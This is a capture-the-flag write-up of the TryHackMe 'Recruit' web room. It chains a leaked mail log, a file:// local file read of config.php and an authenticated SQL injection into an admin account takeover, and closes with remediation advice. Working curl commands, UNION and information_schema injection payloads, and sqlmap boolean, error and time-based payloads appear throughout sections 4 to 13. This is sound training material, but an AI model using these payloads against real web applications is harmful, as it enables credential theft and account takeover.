# TryHackMe — Recruit

> **Platform:** TryHackMe  
> **Category:** Web Application Security  
> **Difficulty:** Easy  
> **Author:** Artem Nos  
> **Status:** Completed  
> **Disclosure:** Credentials and flags are intentionally partially redacted.

---

## Overview

**Recruit** is a web exploitation room built around a realistic attack chain rather than a single isolated vulnerability.

The application exposes sensitive operational information through an accessible mail log, allows local PHP source disclosure through an unsafe file-handling endpoint, and contains an authenticated SQL injection vulnerability in the candidate search functionality.

The final compromise path was:

```text
Information Disclosure
        ↓
Local File Read / Source Disclosure
        ↓
Credential Exposure
        ↓
Authenticated Access as HR
        ↓
SQL Injection
        ↓
Database Enumeration
        ↓
Administrative Credential Disclosure
        ↓
Administrator Account Takeover
```

This write-up documents both the manual methodology and the supporting use of `sqlmap`.

> [!IMPORTANT]
> This write-up was produced for an authorized TryHackMe training environment.  
> Do not reproduce these techniques against systems without explicit permission.

---

## Target Information

The target was added to `/etc/hosts`:

```text
10.145.139.90 recruit.thm
```

Example:

```bash
echo "10.145.139.90 recruit.thm" | sudo tee -a /etc/hosts
```

---

## 1. Initial Enumeration

### Port Scanning

A service scan identified three exposed TCP services:

```text
22/tcp  — SSH
53/tcp  — DNS
80/tcp  — HTTP
```

The web application was hosted on Apache with PHP.

A typical scan command for this stage would be:

```bash
nmap -sC -sV -p- recruit.thm
```

### Key Takeaway

Port `80` presented the primary attack surface, while SSH was retained as a potential later-stage access path.

---

## 2. Web Content Discovery

Directory and file enumeration revealed several interesting resources:

```text
/assets/
/javascript/
/mail/
/phpmyadmin/
/api.php
/config.php
/dashboard.php
/file.php
/header.php
/footer.php
/logout.php
```

Example enumeration command:

```bash
ffuf \
  -u http://recruit.thm/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.log \
  -fc 404
```

The most relevant findings were:

- `/mail/`
- `/api.php`
- `/file.php`
- `/dashboard.php`

---

## 3. Information Disclosure Through Mail Logs

Browsing to the `/mail/` directory exposed directory listing.

A readable log file was available:

```text
/mail/mail.log
```

The log disclosed two important facts:

1. The HR username was `hr`.
2. The HR password was stored in `config.php`.
3. Administrator credentials were stored in the backend database rather than in application files.

This information gave a clear exploitation plan:

```text
Read config.php
    ↓
Recover HR credentials
    ↓
Authenticate
    ↓
Reach the protected dashboard
    ↓
Investigate the database-backed functionality
```

### Security Impact

Directory listing and exposed log files can disclose:

- usernames;
- internal file paths;
- application architecture;
- credential locations;
- administrative workflows;
- debugging information.

Even when a log does not contain a password directly, it can significantly reduce the time required to compromise the application.

---

## 4. API Documentation Review

The `/api.php` endpoint documented a file-processing feature:

```text
/file.php?cv=<URL>
```

The parameter appeared to accept a URL pointing to a candidate CV.

Testing showed that the application also accepted the `file://` scheme.

Example:

```text
http://recruit.thm/file.php?cv=file:///var/www/html/config.php
```

The shorter relative form also worked:

```text
http://recruit.thm/file.php?cv=file://config.php
```

Attempts to read sensitive operating-system files such as `/etc/passwd` were blocked:

```text
Access denied
```

However, PHP files inside the web root could still be returned as source code.

---

## 5. Local File Read and PHP Source Disclosure

Using the unsafe `cv` parameter, the application disclosed the contents of `config.php`.

Recovered configuration:

```php
$APP_NAME = 'Recruit';
$APP_ENV = 'production';
$APP_VERSION = '1.2.4';

$HR_PASSWORD = 'hr********23';

$API_ENABLED = true;
$API_VERSION = 'v1';
```

The password is intentionally redacted in this public write-up.

### Vulnerability Classification

This behavior can be described as:

- unsafe URL scheme handling;
- local file read;
- PHP source code disclosure;
- sensitive configuration exposure.

Although arbitrary operating-system file access was partially restricted, access to application source files was enough to expose valid credentials.

### Root Cause

The application accepted user-controlled file locations without securely restricting:

- allowed URI schemes;
- accessible directories;
- canonicalized file paths;
- local filesystem access.

### Recommended Remediation

The application should:

1. Reject all non-HTTP(S) schemes.
2. Use an allowlist of trusted remote hosts.
3. Resolve and validate canonical paths.
4. Never return executable source files.
5. Store secrets outside the web root.
6. Move credentials to environment variables or a dedicated secrets manager.

---

## 6. HR Authentication

The disclosed credentials allowed authentication as the HR user:

```text
Username: hr
Password: hr********23
```

The login form required three POST fields:

```text
username
password
login
```

The `login` field was important. Omitting it prevented successful authentication.

A session was created with `curl`:

```bash
curl -s -L \
  -c cookies.txt \
  -b cookies.txt \
  --data-urlencode 'username=hr' \
  --data-urlencode 'password=hr********23' \
  --data-urlencode 'login=' \
  http://recruit.thm/
```

The authenticated session was verified with:

```bash
curl -s -b cookies.txt \
  http://recruit.thm/dashboard.php |
grep -E 'THM\{|logout.php|Candidate Applications'
```

The HR flag was obtained:

```text
THM{LOGGED_IN_U***}
```

The flag is intentionally partially redacted.

---

## 7. Dashboard Analysis

The authenticated dashboard contained a candidate search form:

```html
<form method="GET">
    <input name="search">
</form>
```

The candidate table displayed four columns.

A single quote was submitted to test how the application handled special characters:

```text
'
```

The server returned a MySQL syntax error.

This was the first strong indication that the `search` parameter was being concatenated directly into a SQL query.

A likely backend query was similar to:

```sql
SELECT id, name, position, status
FROM candidates
WHERE name LIKE '%<USER_INPUT>%';
```

---

## 8. Manual SQL Injection Confirmation

### Database Context

A UNION-based payload was used to extract database metadata:

```bash
sqli "%' UNION SELECT 1,database(),user(),version() -- -"
```

Recovered values:

```text
Database: recruit_db
User: root@localhost
Version: 8.0.33-0ubuntu0.20.04.2
```

This confirmed:

- the backend DBMS was MySQL;
- the application connected as a highly privileged database user;
- the query returned four columns;
- UNION-based extraction was possible.

### Why the Original Candidate Rows Appeared

The payload began with:

```sql
%'
```

This caused the original condition to behave like:

```sql
LIKE '%%'
```

Since `%%` matches every string, the legitimate candidate rows were returned before the injected UNION results.

A cleaner payload can make the original query return no rows:

```bash
sqli "%' AND 1=2 UNION SELECT 1,database(),user(),version() -- -"
```

---

## 9. Creating a Small SQLi Helper

To make manual testing faster, a Bash function was created:

```bash
sqli() {
  curl -s -b cookies.txt --get \
    --data-urlencode "search=$1" \
    http://recruit.thm/dashboard.php |
  sed -n '/<tbody>/,/<\/tbody>/p' |
  sed 's/<[^>]*>/ /g' |
  sed 's/&nbsp;/ /g' |
  tr -s '[:space:]' ' '

  echo
}
```

This helper:

1. reused the authenticated HR session;
2. URL-encoded the SQL payload safely;
3. extracted the HTML table body;
4. removed HTML tags;
5. normalized whitespace.

This was useful for learning because each SQL statement remained visible and under manual control.

---

## 10. Database Enumeration

### Listing Tables

The `information_schema.tables` view was queried:

```bash
sqli "%' UNION SELECT 1,table_name,table_schema,'x' \
FROM information_schema.tables \
WHERE table_schema=database() -- -"
```

Recovered tables:

```text
candidates
users
```

### Enumerating Candidate Columns

The candidate table schema was retrieved:

```bash
sqli "%' UNION SELECT 1,column_name,data_type,'x' \
FROM information_schema.columns \
WHERE table_schema=database() \
AND table_name='candidates' -- -"
```

Recovered structure:

```text
id        int
name      varchar
position  varchar
status    varchar
```

### Enumerating the Users Table

The same technique confirmed that the `users` table contained authentication-related fields:

```text
id
username
password
```

---

## 11. Administrative Credential Extraction

The contents of the `users` table were retrieved with:

```bash
sqli "%' AND 1=2 UNION SELECT id,username,password,'x' \
FROM users -- -"
```

Recovered account:

```text
Username: admin
Password: admin@001*****
```

The password is intentionally partially redacted.

### Security Impact

This represented a complete compromise of the application's authentication boundary.

The SQL injection allowed an authenticated low-privileged user to:

- enumerate the database schema;
- retrieve sensitive user records;
- obtain administrator credentials;
- take over the administrative account.

The risk was increased further because the application connected to MySQL as:

```text
root@localhost
```

Applications should never use the MySQL root account for routine queries.

---

## 12. SQLMap Verification

After manually confirming the injection, `sqlmap` was used to validate and characterize it.

Example command:

```bash
sqlmap \
  -u "http://recruit.thm/dashboard.php?search=test" \
  --cookie="PHPSESSID=<REDACTED>" \
  -p search \
  --batch
```

`sqlmap` identified four working techniques:

```text
Boolean-based blind
Error-based
Time-based blind
UNION query
```

It also detected:

```text
Backend DBMS: MySQL >= 5.6
Web server OS: Ubuntu Linux
Web technology: Apache 2.4.41
Query columns: 4
```

### Example Boolean-Based Payload

```sql
search=-4639' OR 5888=5888#
```

The condition:

```sql
5888=5888
```

is always true, allowing the tool to compare true and false responses.

### Example Error-Based Payload

```sql
search=test' AND GTID_SUBSET(
  CONCAT(
    0x7178767071,
    (SELECT (ELT(3448=3448,1))),
    0x7162787871
  ),
  3448
)-- -
```

The `GTID_SUBSET()` function was used to force a MySQL error containing controlled data.

### Example Time-Based Payload

```sql
search=test' AND (
  SELECT 9197
  FROM (
    SELECT(SLEEP(5))
  )kBBP
)-- -
```

A delayed response confirmed that the injected SQL expression was executed.

### Example UNION Payload

```sql
search=test'
UNION ALL SELECT
NULL,
NULL,
CONCAT(<marker>,<data>,<marker>),
NULL#
```

The markers helped `sqlmap` distinguish extracted data from the rest of the page.

### Manual Testing vs Automation

`sqlmap` did not perform magic. It automated the same logic used manually:

| Manual activity | SQLMap equivalent |
|---|---|
| Submit `'` | Heuristic injection test |
| Compare true and false conditions | Boolean-based detection |
| Trigger database errors | Error-based extraction |
| Use `SLEEP()` | Time-based confirmation |
| Test `ORDER BY` | Determine column count |
| Use `UNION SELECT` | Retrieve database output |
| Query `information_schema` | Enumerate schemas and tables |

The manual process was essential for understanding the vulnerability. Automation was then useful for verification and efficiency.

---

## 13. Administrator Login

A separate cookie jar was used to avoid overwriting the HR session:

```bash
curl -s -L \
  -c admin-cookies.txt \
  -b admin-cookies.txt \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=admin@001*****' \
  --data-urlencode 'login=' \
  http://recruit.thm/
```

The administrative session was verified with:

```bash
curl -s -b admin-cookies.txt \
  http://recruit.thm/dashboard.php |
grep -E 'THM\{|logout.php|Admin|Administrator'
```

The administrator flag was recovered:

```text
THM{LOGGED_IN_AD*****}
```

The flag is intentionally partially redacted.

---

## 14. Vulnerability Summary

| Finding | Severity | Impact |
|---|---:|---|
| Directory listing enabled | Low / Medium | Exposed internal files and operational information |
| Publicly accessible mail log | Medium | Disclosed username and credential location |
| Unsafe `file://` handling | High | Allowed local PHP source disclosure |
| Plaintext credential in configuration | High | Enabled HR account compromise |
| Authenticated SQL injection | Critical | Allowed database extraction and admin takeover |
| Database connection as MySQL root | Critical | Increased potential impact of SQL injection |
| Plaintext administrative password storage | Critical | Direct credential disclosure |

---

## 15. Attack Chain

```text
1. Enumerated the web application
2. Discovered /mail/mail.log
3. Learned that the HR password was stored in config.php
4. Identified /file.php?cv=<URL>
5. Used file:// to read config.php source
6. Recovered the HR credentials
7. Logged in as HR
8. Identified SQL injection in the search parameter
9. Determined that the query used four columns
10. Enumerated recruit_db
11. Discovered candidates and users tables
12. Extracted the administrator credentials
13. Authenticated as administrator
14. Retrieved the final flag
```

---

## 16. Remediation Recommendations

### File-Handling Endpoint

- Restrict accepted protocols to an explicit allowlist.
- Reject `file://`, `gopher://`, `ftp://`, and other unnecessary schemes.
- Validate the final resolved destination.
- Prevent access to local and private network resources.
- Do not return raw file contents to users.

### Secret Management

- Remove credentials from source-controlled configuration files.
- Use environment variables or a secrets manager.
- Rotate all credentials exposed through the application.
- Never store reusable passwords in plaintext.

### SQL Injection

Use prepared statements with bound parameters.

Unsafe example:

```php
$sql = "SELECT * FROM candidates WHERE name LIKE '%" . $_GET['search'] . "%'";
```

Safer example:

```php
$stmt = $pdo->prepare(
    "SELECT id, name, position, status
     FROM candidates
     WHERE name LIKE :search"
);

$stmt->execute([
    ':search' => '%' . $_GET['search'] . '%'
]);
```

### Database Privileges

The web application should use a dedicated database account with only the permissions it requires.

It should not connect as:

```text
root@localhost
```

A restricted application user should have access only to the necessary database and operations.

### Logging and Deployment

- Disable directory listing.
- Prevent logs from being served by the web server.
- Store operational logs outside the document root.
- Disable detailed database errors in production.
- Add centralized monitoring for suspicious query patterns.

---

## 17. Lessons Learned

This room reinforced several important penetration-testing principles.

### Enumeration Creates the Attack Path

The initial mail log did not directly compromise the administrator account. Instead, it revealed where the next useful secret was located.

Small information leaks often become critical when chained together.

### Partial Restrictions Are Not Sufficient

The application blocked access to `/etc/passwd`, but still allowed access to PHP source files under the web root.

Protecting only a few well-known files does not fix unsafe file access.

### Authenticated Functionality Must Be Tested

The SQL injection was located behind the HR login.

A security assessment that only tests unauthenticated pages can miss serious vulnerabilities in protected application functionality.

### Manual Validation Builds Real Understanding

Manually identifying:

- the SQL error;
- the number of columns;
- the backend database;
- the schema;
- the tables;
- the target credentials;

made the later `sqlmap` output much easier to understand.

### Automation Is a Force Multiplier

Tools such as `sqlmap` are most useful after the tester understands the input, query context, session requirements, and likely impact.

Automation should support analysis, not replace it.

### Vulnerabilities Become More Dangerous in Chains

No single issue fully explains the compromise.

The result came from combining:

```text
Exposed log
+ unsafe file handler
+ plaintext secret
+ authenticated SQL injection
+ weak database privileges
= administrator account takeover
```

---

## Conclusion

The **Recruit** room demonstrated a complete web application compromise through a chain of realistic weaknesses.

The most important finding was the authenticated SQL injection in the candidate search parameter. However, exploitation only became possible because earlier information disclosure and local source-reading issues exposed valid HR credentials.

The room was particularly valuable because it showed how professional penetration testing combines:

- careful enumeration;
- manual verification;
- source and configuration analysis;
- session-aware request handling;
- database enumeration;
- controlled automation;
- impact validation.

The final result was full administrative access to the application.

---

## Disclaimer

This document is intended solely for educational use in an authorized TryHackMe environment.

Credentials, session identifiers, target addresses, and flags have been partially redacted to avoid publishing direct challenge answers.

Unauthorized security testing is illegal and unethical.
